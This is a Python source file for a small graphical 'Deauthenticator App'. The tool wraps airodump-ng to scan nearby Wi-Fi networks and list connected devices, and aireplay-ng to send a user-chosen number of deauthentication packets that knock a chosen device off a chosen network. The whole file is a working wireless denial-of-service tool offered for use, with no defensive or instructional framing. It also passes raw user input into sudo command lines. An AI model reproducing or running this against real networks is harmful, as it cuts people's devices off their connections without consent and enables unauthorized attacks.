import customtkinter
import subprocess



def get_connected():
    channel_number=channel.get()
    target_mac=attack.get()
    subprocess.Popen(['xterm', '-e', f'sudo airodump-ng --bssid {target_mac} --channel {channel_number} wlan0'])
  
    
    
def scan():
    subprocess.Popen(['xterm','-e', 'sudo airodump-ng wlan0'])


def perform_attack():
    target_mac=attack.get()

    target_device=target.get()
    number=number_of_packets.get()
    subprocess.Popen(['xterm', '-e', f'sudo aireplay-ng --deauth {number} -a {target_mac} -c {target_device} wlan0'])

        
customtkinter.set_appearance_mode('Dark')
customtkinter.set_default_color_theme('dark-blue')

root=customtkinter.CTk()
root.geometry('500x500')
root.title('Deauthenticator App: Made by Luai Ehsan')
frame=customtkinter.CTkFrame(master=root)
frame.pack(pady=20, padx=60, fill='both',expand=True)
label=customtkinter.CTkLabel(master=frame, text='Deauthenticator App',font=('Roboto',24),width=200)
label.pack(pady=12,padx=10)
scan_button=customtkinter.CTkButton(master=frame,text="Scan",font=('Roboto',20),width=200,command=scan)
get_connected_devices=customtkinter.CTkButton(master=frame,text="Get Devices",font=('Roboto',20),width=200,command=get_connected)
attack_button=customtkinter.CTkButton(master=frame,text="Attack",font=('Roboto',20),width=200,command=perform_attack)
attack=customtkinter.CTkEntry(master=frame, placeholder_text='Wireless Network',width=200)
channel=customtkinter.CTkEntry(master=frame, placeholder_text='Channel Number',width=200)
target=customtkinter.CTkEntry(master=frame, placeholder_text='Device to Attack',width=200)
number_of_packets=customtkinter.CTkEntry(master=frame, placeholder_text='Number of Packets',width=200)
whos_connected=customtkinter.CTkButton(master=frame,text="Get Connected Hosts",font=('Roboto',20),width=200,command=get_connected)




scan_button.pack(pady=12,padx=10)
attack.pack(pady=12,padx=10)
channel.pack(pady=12,padx=10)
whos_connected.pack(pady=12,padx=10)
target.pack(pady=12,padx=10)
number_of_packets.pack(pady=12,padx=10)
attack_button.pack(pady=12,padx=10)
root.mainloop()